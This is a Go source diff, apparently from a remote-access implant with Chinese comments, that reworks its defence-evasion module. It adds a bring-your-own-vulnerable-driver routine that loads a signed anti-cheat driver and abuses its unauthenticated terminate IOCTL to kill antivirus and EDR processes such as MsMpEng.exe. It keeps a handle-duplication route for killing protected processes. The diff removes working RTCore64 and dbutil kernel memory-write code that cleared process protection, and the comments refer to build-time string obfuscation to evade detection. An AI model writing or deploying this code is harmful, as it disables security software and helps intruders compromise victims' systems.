@@ -4,7 +4,6 @@ package main
 
 import (
 	"encoding/base64"
-	"encoding/binary"
 	"encoding/json"
 	"errors"
 	"fmt"
@@ -17,79 +16,39 @@ import (
 	"golang.org/x/sys/windows"
 )
 
-// ─── BYOVD 驱动加载 + PPL 击杀（内核级，实验性）──────────────────────────
+// ─── BYOVD 驱动加载 + 进程击杀（kgameprotect）──────────────────────────
+//
+// 内置驱动：kgameprotect.sys（国产游戏反作弊驱动，WHQL 签名，见服务端
+//   internal/server/drivers）。设备 `\\.\kgameprotect`，漏洞 IOCTL 0x222048
+//   （METHOD_BUFFERED + FILE_ANY_ACCESS，入参首个 DWORD = PID）：驱动内部直接
+//   PsLookupProcessByProcessId → ObOpenObjectByPointer(PROCESS_TERMINATE) →
+//   ZwTerminateProcess，无需调用方权限，因此可终止普通杀软/EDR 进程。
+//
+// ⚠️ 该驱动**不具备任意内核读写能力**（只能按 PID 终止进程），因此植入端不再有
+//   任何"读写内核虚拟地址、改 EPROCESS.Protection"的路线：原先配套的"任意内存
+//   读写"型驱动路线（相关常量、IOCTL、EPROCESS 地址获取与保护清除 helper、
+//   动态偏移探测调用）已全部删除，不留死代码、不留误导性文案。对 PPL 保护进程
+//   该终止 IOCTL 无效，PPL 击杀只走句柄窃取路线（见 handlePPLKill）。
 //
 // byovd_load：把操作员提供的（已签名但易受攻击的）驱动 .sys 写入系统驱动目录，
-//   通过 SCM 创建并启动内核服务，返回设备路径（如 \\.\RTCore64）。
+//   通过 SCM 创建并启动内核服务，返回设备路径（如 \\.\kgameprotect）。
 //   写入前会先尽力停止同名旧服务并删除旧文件（防止文件被占用）。
 // byovd_unload：停止并删除服务、删除驱动文件。
-// ppl_kill：先直接 TerminateProcess；对 PPL/自保护进程（拒绝访问）尝试
-//   内核级清除 EPROCESS.Protection 后重试，按可用驱动自动选择路线：
-//     1) RTCore64（默认）— 任意内核虚拟地址读写（逆向自原厂驱动）：
-//        a) NtQuerySystemInformation 取目标进程 EPROCESS 虚拟地址；
-//        b) IOCTL 0x80002068/0x8000206C 直接读改写 Protection（48 字节
-//           METHOD_BUFFERED 结构，1/2/4 字节访问），无物理扫描、无蓝屏风险；
-//        c) 仅当 Protection 字节非零（确为 PPL）才清零，非 PPL 不写。
-//     2) dbutil_2_3 风格 — "任意虚拟地址写"路线（需自行上传驱动，已被
-//        黑名单/杀软重点标记）：直接写 EPROCESS VA（无校验，备用）。
-//   EPROCESS.Protection 偏移按 Windows build 号自动选择（RtlGetVersion；
-//   Win11 24H2+/26100 起结构大改，Protection=0x5FA）。
-//
-// ⚠️ 实验性：偏移数据来自公开研究，需实机验证；驱动为操作员提供或内置
-//    （RTCore64.sys 为原厂 MSI 签名二进制，SHA-256 已核对）。
+// byovd_kill：解析 {"pid":1234} 或 {"process_name":"MsMpEng.exe"}（可选
+//   {"device":...,"ioctl":...} 覆盖驱动档案），对每个 PID 调用 kgameprotect 的
+//   无鉴权终止 IOCTL（默认 0x222048）结束进程。
+// ppl_kill：先直接 TerminateProcess；失败（PPL/自保护进程拒绝访问）时走
+//   NtDuplicateObject 句柄窃取路线后终止。
 
-const (
-	// 内核级 PPL 清除路线（按已加载驱动自动选择）
-	rtDevice = `\\.\RTCore64`
-	// RTCore64 IOCTL（逆向自原厂驱动：IoControlCode+0x7FFFE000 查跳转表）
-	rtIoctlReadMem  = 0x80002068 // 读 1/2/4 字节（内核虚拟地址，METHOD_BUFFERED 48B）
-	rtIoctlWriteMem = 0x8000206C // 写 1/2/4 字节
-	rtIoctlReadMsr  = 0x80002050 // 读 MSR（自检用）
-	// dbutil_2_3.sys 设备与"任意虚拟地址写"IOCTL（备用路线，需手动上传驱动）
-	defaultPPLDevice  = `\\.\DBUtil_2_3`
-	defaultWriteIOCTL = 0x9C40A4E4
+// 内置 BYOVD 驱动 kgameprotect 的终止 IOCTL（数值常量，不受字符串混淆影响）。
+const kgKillIOCTL = 0x222048 // METHOD_BUFFERED + FILE_ANY_ACCESS，入参首个 DWORD = PID
+
+// 设备名与服务名必须用 var 声明：构建期会做字符串混淆（把字面量改写成 xd("...")
+// 调用），const 声明里不允许非恒定表达式，写进 const 会导致 full 档编译失败。
+var (
+	kgDevice  = `\\.\kgameprotect`
+	kgService = "kgameprotect" // byovd_load / byovd_unload 的默认服务名
 )
-
-// windowsVersion 通过 RtlGetVersion 读取版本（绕过 GetVersionEx 兼容层）。
-func windowsVersion() (major, minor, build uint32) {
-	proc := resolveAPI("ntdll.dll", "RtlGetVersion")
-	type osVersionInfoExW struct {
-		size             uint32
-		major            uint32
-		minor            uint32
-		build            uint32
-		platformID       uint32
-		csdVersion       [128]uint16
-		servicePackMajor uint16
-		servicePackMinor uint16
-		suiteMask        uint16
-		productType      uint8
-		reserved         uint8
-	}
-	v := osVersionInfoExW{size: uint32(unsafe.Sizeof(osVersionInfoExW{}))}
-	st, _, _ := proc.Call(uintptr(unsafe.Pointer(&v)))
-	if st != 0 {
-		return 0, 0, 0
-	}
-	return v.major, v.minor, v.build
-}
-
-// selectProtectionOffset 按 Windows build 号选择 EPROCESS.Protection 偏移（x64）。
-// Win11 24H2+（26100）起 EPROCESS 结构大改：SignatureLevel=0x5F8 → Protection=0x5FA
-// （数据来源：公开逆向记录，需实机验证）。
-func selectProtectionOffset() uint64 {
-	_, _, build := windowsVersion()
-	switch {
-	case build >= 26100:
-		return 0x5FA
-	case build >= 19041:
-		return 0x87A
-	case build >= 18362:
-		return 0x5E6
-	default:
-		return 0x5C8
-	}
-}
 
 func handleBYOVDLoad(taskData string) (string, int32, string) {
 	var req struct {
@@ -105,7 +64,7 @@ func handleBYOVDLoad(taskData string) (string, int32, string) {
 	}
 	svc := req.ServiceName
 	if svc == "" {
-		svc = "tsdrv"
+		svc = kgService
 	}
 	driver, err := base64Decode(req.DriverB64)
 	if err != nil {
@@ -166,13 +125,109 @@ func handleBYOVDUnload(taskData string) (string, int32, string) {
 	_ = json.Unmarshal([]byte(taskData), &req)
 	svc := req.ServiceName
 	if svc == "" {
-		svc = "tsdrv"
+		svc = kgService
 	}
 	if err := stopKernelService(svc); err != nil {
 		return "", -1, fmt.Sprintf("stop service failed: %v", err)
 	}
 	_ = os.Remove(filepath.Join(os.Getenv("SystemRoot"), "System32", "drivers", svc+".sys"))
 	return "driver unloaded: " + svc, 0, ""
+}
+
+// byovdKillByPID 通过驱动的无鉴权进程终止 IOCTL 结束指定 PID。
+// device/ioctl 为空时使用内置 kgameprotect 默认值（设备 `\\.\kgameprotect`、
+// IOCTL 0x222048）；METHOD_BUFFERED 的入参就是 4 字节 PID，无出参。
+func byovdKillByPID(device string, ioctl uint32, pid uint32) error {
+	if device == "" {
+		device = kgDevice
+	}
+	if ioctl == 0 {
+		ioctl = kgKillIOCTL
+	}
+
+	procCreateFileW := resolveAPI("kernel32.dll", "CreateFileW")
+	procDeviceIoControl := resolveAPI("kernel32.dll", "DeviceIoControl")
+	procCloseHandle := resolveAPI("kernel32.dll", "CloseHandle")
+
+	pw, _ := windows.UTF16PtrFromString(device)
+	// GENERIC_READ|GENERIC_WRITE(0xC0000000)、FILE_SHARE_READ|FILE_SHARE_WRITE(0x3)、OPEN_EXISTING(3)
+	h, _, _ := procCreateFileW.Call(uintptr(unsafe.Pointer(pw)), 0xC0000000, 0x3, 0, 3, 0, 0)
+	if h == ^uintptr(0) {
+		return fmt.Errorf("打开 %s 失败：请先用 byovd_load 加载内置 kgameprotect.sys（或确认驱动是否被系统拦截）", device)
+	}
+	defer procCloseHandle.Call(h)
+
+	in := pid // 入参首个 DWORD = PID
+	var ret uint32
+	r1, _, _ := procDeviceIoControl.Call(h, uintptr(ioctl),
+		uintptr(unsafe.Pointer(&in)), 4, 0, 0, uintptr(unsafe.Pointer(&ret)), 0)
+	if r1 == 0 {
+		return fmt.Errorf("DeviceIoControl(0x%06X, pid=%d) 失败：驱动拒绝终止（PPL 保护进程该 IOCTL 无效，或 PID 已退出）", ioctl, pid)
+	}
+	return nil
+}
+
+// handleBYOVDKill 解析 {"pid":1234} 或 {"process_name":"MsMpEng.exe"}，
+// 对每个解析出的 PID 调用 kgameprotect 的无鉴权终止 IOCTL。
+// 可选字段 device/ioctl 用于覆盖驱动档案（缺省用内置 kgameprotect 默认值）。
+func handleBYOVDKill(taskData string) (string, int32, string) {
+	var req struct {
+		PID         uint32 `json:"pid"`
+		ProcessName string `json:"process_name"`
+		Device      string `json:"device"`
+		IOCTL       uint32 `json:"ioctl"`
+	}
+	if err := json.Unmarshal([]byte(taskData), &req); err != nil {
+		return "", -1, fmt.Sprintf("parse byovd_kill data failed: %v", err)
+	}
+
+	device := req.Device
+	if device == "" {
+		device = kgDevice
+	}
+	ioctl := req.IOCTL
+	if ioctl == 0 {
+		ioctl = kgKillIOCTL
+	}
+
+	// 目标解析：pid 直接反查进程名；process_name 走 Toolhelp32 快照解析成 PID 列表后逐个尝试。
+	type target struct {
+		name string
+		pid  uint32
+	}
+	var targets []target
+	seen := map[uint32]bool{}
+	if req.PID != 0 {
+		seen[req.PID] = true
+		targets = append(targets, target{name: processNameOfPID(req.PID), pid: req.PID})
+	}
+	if req.ProcessName != "" {
+		for _, pid := range findProcessPIDs(req.ProcessName) {
+			if seen[pid] {
+				continue
+			}
+			seen[pid] = true
+			targets = append(targets, target{name: req.ProcessName, pid: pid})
+		}
+	}
+	if len(targets) == 0 {
+		return "", -1, `missing pid/process_name（用法：{"pid":1234} 或 {"process_name":"MsMpEng.exe"}；进程名未匹配到运行中的进程）`
+	}
+
+	var b strings.Builder
+	b.WriteString(fmt.Sprintf("== BYOVD Kill (kgameprotect, IOCTL 0x%06X) ==\n", ioctl))
+	for _, t := range targets {
+		name := t.name
+		if name == "" {
+			name = "unknown"
+		}
+		if err := byovdKillByPID(device, ioctl, t.pid); err != nil {
+			b.WriteString(fmt.Sprintf("[-] %v\n", err))
+			continue
+		}
+		b.WriteString(fmt.Sprintf("[+] killed %d (%s) via kgameprotect (IOCTL 0x%06X)\n", t.pid, name, ioctl))
+	}
+	return b.String(), 0, ""
 }
 
 func handlePPLKill(taskData string) (string, int32, string) {
@@ -186,31 +241,9 @@ func handlePPLKill(taskData string) (string, int32, string) {
 		names = defaultAVProcesses
 	}
 
-	protOff := selectProtectionOffset()
-	rtReady := deviceExists(rtDevice)
-	dbuReady := deviceExists(defaultPPLDevice)
-
 	var b strings.Builder
 	b.WriteString("== PPL Kill ==\n")
-	major, minor, build := windowsVersion()
-	b.WriteString(fmt.Sprintf("[*] Windows %d.%d.%d, EPROCESS.Protection offset=0x%x\n", major, minor, build, protOff))
-	switch {
-	case rtReady:
-		b.WriteString("[*] 内核路线: RTCore64 任意内核虚拟地址读写（IOCTL 0x80002068/0x8000206C，EPROCESS VA 直改）\n")
-		// 驱动自检：读 IA32_KERNEL_GS_BASE MSR，非零即驱动原语可用
-		if h, err := openRTDevice(); err == nil {
-			if v, ok := rtReadMsr(h, 0xC0000102); ok && v != 0 {
-				b.WriteString(fmt.Sprintf("[*] 驱动自检 OK: MSR[KERNEL_GS_BASE]=0x%x\n", v))
-			} else {
-				b.WriteString("[!] 驱动自检失败: MSR 读取未返回（IOCTL 可能被拦截/驱动版本不符）\n")
-			}
-			resolveAPI("kernel32.dll", "CloseHandle").Call(h)
-		}
-	case dbuReady:
-		b.WriteString("[*] 内核路线: DBUtil_2_3 任意虚拟地址写（备用，无校验）\n")
-	default:
-		b.WriteString("[!] 未检测到可用驱动（RTCore64/dbutil_2_3），PPL 清除不可用\n")
-	}
+	b.WriteString("[*] PPL 击杀路线：句柄窃取（DuplicateHandle from 受保护进程）；内置驱动 kgameprotect 只提供进程终止 IOCTL，不具备内核读写，无法直接改 EPROCESS.Protection\n")
 
 	// 收集目标：(进程名, pid)。names 走 Toolhelp32 快照；pids 直接反查进程名。
 	type target struct {
@@ -243,41 +276,12 @@ func handlePPLKill(taskData string) (string, int32, string) {
 			b.WriteString(fmt.Sprintf("[+] %s (pid=%d) terminated\n", t.name, t.pid))
 			continue
 		}
-		// 直接终止失败 → 尝试内核级清除 PPL 保护
-		switch {
-		case rtReady:
-			cleared, diag, clearErr := clearPPLProtectionRTCore64(t.pid)
-			if clearErr != nil {
-				b.WriteString(fmt.Sprintf("[-] %s (pid=%d): PPL清除失败 %v [%s]\n", t.name, t.pid, clearErr, diag))
-				continue
-			}
-			b.WriteString(fmt.Sprintf("[*] %s (pid=%d): %s\n", t.name, t.pid, diag))
-			if cleared {
-				if err := terminateByPID(t.pid); err == nil {
-					b.WriteString(fmt.Sprintf("[+] %s (pid=%d) terminated after PPL clear\n", t.name, t.pid))
-				} else {
-					b.WriteString(fmt.Sprintf("[?] %s (pid=%d): PPL已清除但仍无法终止: %v\n", t.name, t.pid, err))
-				}
-			} else {
-				b.WriteString(fmt.Sprintf("[?] %s (pid=%d): 非 PPL 保护，PPL 清除未执行，直接终止仍被拦截\n", t.name, t.pid))
-			}
-		case dbuReady:
-			if err := clearPPLProtectionVA(t.pid); err != nil {
-				b.WriteString(fmt.Sprintf("[-] %s (pid=%d): PPL清除失败 %v\n", t.name, t.pid, err))
-				continue
-			}
-			if err := terminateByPID(t.pid); err == nil {
-				b.WriteString(fmt.Sprintf("[+] %s (pid=%d) terminated after PPL clear\n", t.name, t.pid))
-			} else {
-				b.WriteString(fmt.Sprintf("[?] %s (pid=%d): PPL已清除但仍无法终止: %v\n", t.name, t.pid, err))
-			}
-		default:
-			// 无驱动备选：NtDuplicateObject 从 SYSTEM 窃取目标进程句柄后终止
-			if err := killPPLNoDriver(t.pid); err == nil {
-				b.WriteString(fmt.Sprintf("[+] %s (pid=%d) terminated via handle duplication\n", t.name, t.pid))
-			} else {
-				b.WriteString(fmt.Sprintf("[-] %s (pid=%d): 无可用驱动且句柄窃取失败（请先 byovd_load 加载 RTCore64/dbutil_2_3）: %v\n", t.name, t.pid, err))
-			}
+		// 直接终止失败（PPL/自保护进程拒绝访问）→ 句柄窃取路线
+		// （NtDuplicateObject 从 SYSTEM 复制目标进程句柄后终止）
+		if err := killPPLNoDriver(t.pid); err == nil {
+			b.WriteString(fmt.Sprintf("[+] %s (pid=%d) terminated via handle duplication\n", t.name, t.pid))
+		} else {
+			b.WriteString(fmt.Sprintf("[-] %s (pid=%d): 句柄窃取失败（受保护进程未持有可复制句柄；普通杀软/EDR 进程请用 byovd_kill + 内置 kgameprotect）: %v\n", t.name, t.pid, err))
 		}
 	}
 	return b.String(), 0, ""
@@ -439,7 +443,7 @@ func terminateByPID(pid uint32) error {
 	return nil
 }
 
-// ─── PPL 保护清除（内核级，实验性）────────────────────────────────
+// ─── 驱动 / 进程通用 helper ──────────────────────────────────────
 
 // deviceExists 检查设备是否存在（用于判断驱动是否已加载）。
 func deviceExists(path string) bool {
@@ -451,182 +455,6 @@ func deviceExists(path string) bool {
 	}
 	resolveAPI("kernel32.dll", "CloseHandle").Call(h)
 	return true
-}
-
-// getEprocessVA 通过 SystemHandleInformation 获取指定 PID 进程对象的 EPROCESS 内核地址。
-func getEprocessVA(pid uint32) (uintptr, error) {
-	proc := resolveAPI("ntdll.dll", "NtQuerySystemInformation")
-	buf := make([]byte, 0x400000)
-	var retLen uint32
-	st, _, _ := proc.Call(16 /*SystemHandleInformation*/, uintptr(unsafe.Pointer(&buf[0])), uintptr(len(buf)), uintptr(unsafe.Pointer(&retLen)))
-	if st != 0 {
-		return 0, fmt.Errorf("NtQuerySystemInformation failed: 0x%x", st)
-	}
-	count := binary.LittleEndian.Uint32(buf[:4])
-	// 条目 24 字节（x64）：PID(2)+BackTrace(2)+Type(1)+Attr(1)+Handle(2)+pad(2)+Object(8)+Access(4)
-	for i := 0; i < int(count); i++ {
-		off := 4 + i*24
-		if off+24 > len(buf) {
-			break
-		}
-		ePid := binary.LittleEndian.Uint16(buf[off:])
-		objType := buf[off+4]
-		obj := binary.LittleEndian.Uint64(buf[off+16:])
-		// 进程对象类型索引通常为 7（随版本变化）
-		if uint32(ePid) == pid && objType == 7 && obj != 0 {
-			return uintptr(obj), nil
-		}
-	}
-	return 0, errors.New("process object not found")
-}
-
-// ─── 路线 1：RTCore64 任意内核虚拟地址读写（默认）──────────────────
-//
-// 原厂 MSI Afterburner RTCore64.sys（本驱动经逆向确认）的 IOCTL 分发：
-//   计算 (IoControlCode + 0x7FFFE000) 后查跳转表，即实际可用码为 0x800020xx 家族。
-//   任意内存读写为：
-//     0x80002068 读 1/2/4 字节 / 0x8000206C 写 1/2/4 字节（METHOD_BUFFERED，
-//     48 字节结构体：+0x08=目标内核虚拟地址(QWORD)，+0x14=32位基址加数(置0)，
-//     +0x18=长度(1/2/4)，+0x1C=值）。
-//   因此无需物理内存扫描：拿 EPROCESS 虚拟地址直接读改写 Protection 即可，
-//   无扫描蓝屏风险、无偏移匹配问题。
-
-// openRTDevice 打开 RTCore64 设备。
-func openRTDevice() (uintptr, error) {
-	procCreateFileW := resolveAPI("kernel32.dll", "CreateFileW")
-	pw, _ := windows.UTF16PtrFromString(rtDevice)
-	h, _, _ := procCreateFileW.Call(uintptr(unsafe.Pointer(pw)), 0xC0000000, 0, 0, 3, 0, 0)
-	if h == ^uintptr(0) {
-		return 0, errors.New("open " + rtDevice + " failed（驱动未加载或设备名不同）")
-	}
-	return h, nil
-}
-
-// rtMemOp 构造 48 字节 METHOD_BUFFERED 结构并执行 IOCTL。
-// ioctl=0x80002068 读（结果写回 in[0x1C]）；0x8000206C 写（in[0x1C] 为写入值）。
-func rtMemOp(hDev uintptr, ioctl uint32, va uint64, size uint32, value uint32) (uint32, bool) {
-	proc := resolveAPI("kernel32.dll", "DeviceIoControl")
-	in := make([]byte, 0x30)
-	binary.LittleEndian.PutUint64(in[0x08:], va)
-	binary.LittleEndian.PutUint32(in[0x14:], 0) // 32 位基址加数
-	binary.LittleEndian.PutUint32(in[0x18:], size)
-	binary.LittleEndian.PutUint32(in[0x1C:], value)
-	var ret uint32
-	r1, _, _ := proc.Call(hDev, uintptr(ioctl), uintptr(unsafe.Pointer(&in[0])), 0x30,
-		uintptr(unsafe.Pointer(&in[0])), 0x30, uintptr(unsafe.Pointer(&ret)), 0)
-	if r1 == 0 {
-		return 0, false
-	}
-	return binary.LittleEndian.Uint32(in[0x1C:]), true
-}
-
-// rtReadMem 读目标内核虚拟地址处 1/2/4 字节。
-func rtReadMem(hDev uintptr, va uint64, size uint32) (uint32, bool) {
-	return rtMemOp(hDev, rtIoctlReadMem, va, size, 0)
-}
-
-// rtWriteMem 写目标内核虚拟地址处 1/2/4 字节。
-func rtWriteMem(hDev uintptr, va uint64, size uint32, value uint32) bool {
-	_, ok := rtMemOp(hDev, rtIoctlWriteMem, va, size, value)
-	return ok
-}
-
-// rtReadMsr 读 MSR（IOCTL 0x80002050：入参 12 字节 [MSR,0,0]，出参 [MSR,Hi,Lo]）。
-func rtReadMsr(hDev uintptr, msr uint32) (uint64, bool) {
-	proc := resolveAPI("kernel32.dll", "DeviceIoControl")
-	in := make([]byte, 0xC)
-	binary.LittleEndian.PutUint32(in[0:], msr)
-	var ret uint32
-	r1, _, _ := proc.Call(hDev, rtIoctlReadMsr, uintptr(unsafe.Pointer(&in[0])), 0xC,
-		uintptr(unsafe.Pointer(&in[0])), 0xC, uintptr(unsafe.Pointer(&ret)), 0)
-	if r1 == 0 {
-		return 0, false
-	}
-	hi := binary.LittleEndian.Uint32(in[4:])
-	lo := binary.LittleEndian.Uint32(in[8:])
-	return uint64(hi)<<32 | uint64(lo), true
-}
-
-// clearPPLProtectionRTCore64 用 RTCore64 的任意内核虚拟地址读写清除
-// 目标进程 EPROCESS.Protection（EPROCESS VA 来自 NtQuerySystemInformation）。
-// Protection 偏移优先动态探测（沿 ActiveProcessLinks 遍历 + 特征签名，
-// 兼容未来 Windows 版本），失败回退硬编码表。
-// 仅当 Protection 字节非零（确为 PPL 保护）时才清零，非 PPL 进程跳过写入。
-// 返回（是否写入, 诊断信息, 错误）。
-func clearPPLProtectionRTCore64(pid uint32) (bool, string, error) {
-	hDev, err := openRTDevice()
-	if err != nil {
-		return false, "", err
-	}
-	defer resolveAPI("kernel32.dll", "CloseHandle").Call(hDev)
-
-	eprocess, err := getEprocessVA(pid)
-	if err != nil {
-		return false, "", fmt.Errorf("获取 EPROCESS VA 失败: %v", err)
-	}
-
-	// 优先动态探测偏移（不依赖 build 表），失败回退硬编码
-	protOff := uint64(selectProtectionOffset())
-	dynOff, derr := selectProtectionOffsetDynamic(hDev, pid)
-	if derr == nil && dynOff > 0 {
-		protOff = dynOff
-	}
-
-	// 读 Protection 字节（4 字节对齐读回改写，兼容任意偏移）
-	bytePos := uint64(protOff & 3)
-	aligned := uint64(eprocess) + protOff - bytePos
-	cur, ok := rtReadMem(hDev, aligned, 4)
-	if !ok {
-		return false, fmt.Sprintf("eprocess=0x%x protOff=0x%x(dyn=%v)", eprocess, protOff, derr == nil),
-			errors.New("rtReadMem 失败（驱动 IOCTL 被拦截？）")
-	}
-	protByte := byte((cur >> (bytePos * 8)) & 0xFF)
-	if protByte == 0 || protByte == 0xFF {
-		return false, fmt.Sprintf("eprocess=0x%x protOff=0x%x protection=0x%02x", eprocess, protOff, protByte),
-			errors.New("Protection=0（非 PPL 保护，杀软自保护驱动拦截需另辟路线）")
-	}
-	// 清零该字节后写回
-	cur &^= 0xFF << (bytePos * 8)
-	if !rtWriteMem(hDev, aligned, 4, cur) {
-		return false, fmt.Sprintf("eprocess=0x%x protOff=0x%x", eprocess, protOff),
-			errors.New("rtWriteMem 失败")
-	}
-	return true, fmt.Sprintf("eprocess=0x%x protOff=0x%x(dyn=%v) protection=0x%02x->0x00", eprocess, protOff, derr == nil, protByte), nil
-}
-
-// ─── 路线 2：dbutil_2_3 任意虚拟地址写（备用）────────────────────
-
-// clearPPLProtectionVA 用"内核虚拟地址写"型驱动清除 EPROCESS.Protection
-// （默认 dbutil_2_3 风格 IOCTL，无校验，风险较高）。
-func clearPPLProtectionVA(pid uint32) error {
-	eprocess, err := getEprocessVA(pid)
-	if err != nil {
-		return err
-	}
-	// 打开设备
-	procCreateFileW := resolveAPI("kernel32.dll", "CreateFileW")
-	procDeviceIoControl := resolveAPI("kernel32.dll", "DeviceIoControl")
-	procCloseHandle := resolveAPI("kernel32.dll", "CloseHandle")
-	pw, _ := windows.UTF16PtrFromString(defaultPPLDevice)
-	hDev, _, _ := procCreateFileW.Call(uintptr(unsafe.Pointer(pw)), 0xC0000000, 0, 0, 3, 0, 0)
-	if hDev == ^uintptr(0) {
-		return errors.New("open " + defaultPPLDevice + " failed（驱动未加载或设备名不同）")
-	}
-	defer procCloseHandle.Call(hDev)
-
-	// 写入 0 到 Protection 偏移（dbutil 结构：dest, src, size）
-	target := eprocess + uintptr(selectProtectionOffset())
-	zero := byte(0)
-	type op struct {
-		dest, src, size uintptr
-	}
-	o := op{dest: target, src: uintptr(unsafe.Pointer(&zero)), size: 1}
-	var ret uint32
-	r1, _, _ := procDeviceIoControl.Call(hDev, defaultWriteIOCTL, uintptr(unsafe.Pointer(&o)), uintptr(unsafe.Sizeof(o)), 0, 0, uintptr(unsafe.Pointer(&ret)), 0)
-	if r1 == 0 {
-		return errors.New("DeviceIoControl write failed")
-	}
-	return nil
 }
 
 func base64Decode(s string) ([]byte, error) {
